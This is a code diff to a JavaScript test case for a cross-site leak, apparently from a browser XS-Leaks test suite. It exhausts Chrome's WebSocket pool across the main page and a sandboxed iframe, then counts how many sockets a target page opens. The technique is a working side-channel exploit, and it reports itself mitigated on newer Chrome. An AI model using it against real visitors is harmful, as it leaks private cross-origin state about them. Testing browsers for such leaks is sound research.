@@ -1,131 +1,156 @@
-// here we go
+import {WS_URL} from '../config.js'
+
+// Blink allows 255 websockets per renderer process, the shared socket pool 256.
+// One process is therefore always one short of filling the pool, so we hold the
+// rest in a sandboxed iframe, which gets an opaque origin and its own process.
+
 let SOCKETS = []
+
+// Stay below 255 here, otherwise our probes fail against the per-process cap.
+const MAIN = 250
+const FILLER = 20
+const SLOTS = 3
+const PROBE_TIMEOUT = 3000
 
 const sleep = (ms) => {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-const exaustWsLimit = async(ws, limit) => {
-    for(let i = 0; i < limit; i++){
-        let s = new WebSocket(ws)
-        SOCKETS.push(s)
-    }
-    
+const filterWS = (state) => SOCKETS.filter(s => s.readyState === state)
 
+const chromeVersion = () => {
+    let m = navigator.userAgent.match(/Chrom(?:e|ium)\/(\d+)/)
+    return m ? parseInt(m[1], 10) : 0
 }
 
-const closeWs = (socks=SOCKETS) => {
-    for(let s of socks.reverse()){
-        s.close()
-    }
-}
-
-const filterWS = (state) => {
-    // connecting state = 0
-    let res = SOCKETS.filter(s => s.readyState === state)
-    return res
-}
-
-const debugWsStatus = () => {
-    let res = {
-        connecting: 0,
-        open: 0,
-        closing: 0,
-        closed: 0
-    }
-    for(let s of SOCKETS){
-        let state = s.readyState
-        if(state === 0){
-            res.connecting++
-        }
-        else if(state === 1){
-            res.open++
-        }
-        else if(state === 2){
-            res.closing++
-        }
-        else if(state === 3){
-            res.closed++
-        }
-        else{
-            console.warn(s, state, 'WTF unknow s.readyState')
-        }
-    }
-    return res
-}
-
-
-const noNewWs = () => {
-    return new Promise(async(r) => {
-        let tmp = -1 
-        while(tmp !== filterWS(1).length){
-            tmp = filterWS(1).length
-            await sleep(1500)
-        }
-        return r(1)
-    })
-}
-
-const waitUntilClosed = () => {
-    return new Promise(async(r) => {
-        while(filterWS(2).length){
-            await sleep(200)
-        }
-        return r(1)
-    })
-}
-
-const iframeWs = (ws) => {
+// Second renderer process, without hosting anything: no allow-same-origin means
+// an opaque origin, which Chrome isolates into its own process.
+const fillerFrame = (n) => {
     let i = document.createElement('iframe')
-    i.src=`https://crossorigin.xsinator.xyz/testcases/tests/websocket.php?1`
+    i.sandbox = 'allow-scripts'
+    i.srcdoc = `<script>
+        const S = []
+        for(let i = 0; i < ${n}; i++) S.push(new WebSocket(${JSON.stringify(WS_URL)}))
+        addEventListener('message', (e) => {
+            if(e.data === 'close') for(const s of S) s.close()
+            if(e.data === 'closePending') for(const s of S) if(s.readyState === 0) s.close()
+        })
+    <\/script>`
     document.body.append(i)
     return i
 }
 
-const leak = async(url, waitTime=2000, limit=255) => {
+const exaustWsLimit = (limit) => {
+    for(let i = 0; i < limit; i++){
+        SOCKETS.push(new WebSocket(WS_URL))
+    }
+}
+
+// Wait until the open count stops growing, which is what a full pool looks like.
+// Adapts to the link's RTT instead of guessing a delay.
+const noNewWs = async (maxMs = 45000) => {
+    let last = -1
+    let stable = 0
+    let waited = 0
+    while(stable < 4 && waited < maxMs){
+        await sleep(500)
+        waited += 500
+        let open = filterWS(1).length
+        if(open === last){
+            stable++
+        }else{
+            stable = 0
+            last = open
+        }
+    }
+    return last
+}
+
+const closeWs = (socks = SOCKETS) => {
+    for(let s of socks){
+        s.close()
+    }
+}
+
+const drop = (socks) => {
+    closeWs(socks)
+    SOCKETS = SOCKETS.filter(s => !socks.includes(s))
+}
+
+const waitUntilClosed = async () => {
+    let attempts = 0
+    while(filterWS(2).length && attempts < 50){
+        await sleep(100)
+        attempts++
+    }
+}
+
+// Only report what the browser told us: still connecting is not a slot we got.
+const probeWs = () => {
+    return new Promise(resolve => {
+        let s = new WebSocket(WS_URL)
+        let timer = setTimeout(() => resolve({state: 'stalled', socket: s}), PROBE_TIMEOUT)
+        s.onopen = () => {
+            clearTimeout(timer)
+            resolve({state: 'open', socket: s})
+        }
+        s.onerror = () => {
+            clearTimeout(timer)
+            resolve({state: 'error', socket: s})
+        }
+    })
+}
+
+const leak = async (url, waitTime = 1500) => {
     let t = performance.now()
-    let ws = 'wss://xsinator.com:8080'
-    console.log(`[+] Exausting WS limit until we can not open any new WS.`)
-    // create one websocket in an out-of-process iframe, because of the 255 limit per site vs the 256 global ws connection limit
-    let i = iframeWs()
-    await exaustWsLimit(ws, limit)
-    console.debug(debugWsStatus(), '=', SOCKETS.length)
 
-    //wait until we dont open any new connections
-    await noNewWs()
-    console.debug(debugWsStatus(), '=', SOCKETS.length)
-    console.log(`[+] Cannot open any new WS.`)
+    // Chrome randomizes the socket pool capacity since 145, so the pool
+    // boundary this measures moves between runs (crbug.com/415691664).
+    if(chromeVersion() >= 145){
+        return 'Mitigated: random pool limit'
+    }
 
-    // close any ws not opened
-    let connectingWS = filterWS(0)
-    console.log(`[+] ${connectingWS.length} WS are already open.`)
-    closeWs(connectingWS)
-    await sleep(300)
-    console.debug(debugWsStatus(), '=', SOCKETS.length)
-    
-    // make some room
-    let d = 10
-    closeWs(SOCKETS.slice(0, d))
-    console.log(`[+] Closing ${d} ws ..`)
-    console.debug(debugWsStatus(), '=', SOCKETS.length)
+    // Fill the shared pool from two processes.
+    let filler = fillerFrame(FILLER)
+    exaustWsLimit(MAIN)
+    let open = await noNewWs()
+    console.debug(`${open} open, ${filterWS(0).length} did not get in`)
 
-    console.log(`[+] Opening ${url} in window.`)
+    // Sockets still connecting never got a slot and would swallow the ones we
+    // free next, so drop them in both processes.
+    drop(filterWS(0))
+    filler.contentWindow.postMessage('closePending', '*')
+    await waitUntilClosed()
+    await sleep(500)
+
+    // Make room for the target page.
+    let released = filterWS(1).slice(0, SLOTS)
+    drop(released)
+    await waitUntilClosed()
+    await sleep(500)
+
     window.WW.location = url
-    // wait for WS to connect on url
     await sleep(waitTime)
-    // try to add some more again
-    console.log(`[+] Checking number of WS.`)
-    await exaustWsLimit(ws, d)
-    
-    await noNewWs()
-    console.debug(debugWsStatus(), '=', SOCKETS.length)
-    // number of connecting ws
-    let res = filterWS(0).length
-    console.log(`[+] ${res} WS on ${url} and ${connectingWS.length} WS were already opened.`)
+
+    // Take the slots back, whatever we cannot get the target took. Keep the ones
+    // that succeed so the pool stays full, drop the rest so none stay queued.
+    let probes = await Promise.all(Array.from({length: released.length}, () => probeWs()))
+    let regained = 0
+    for(let p of probes){
+        if(p.state === 'open'){
+            SOCKETS.push(p.socket)
+            regained++
+        }else{
+            p.socket.close()
+        }
+    }
+    let res = released.length - regained
+    console.debug(`regained ${regained}/${released.length}, ${res} used by target`)
 
     // cleanup
     closeWs(SOCKETS)
-    i.remove()
+    filler.contentWindow.postMessage('close', '*')
+    filler.remove()
     window.WW.location = 'about:blank'
     await waitUntilClosed()
     SOCKETS = []
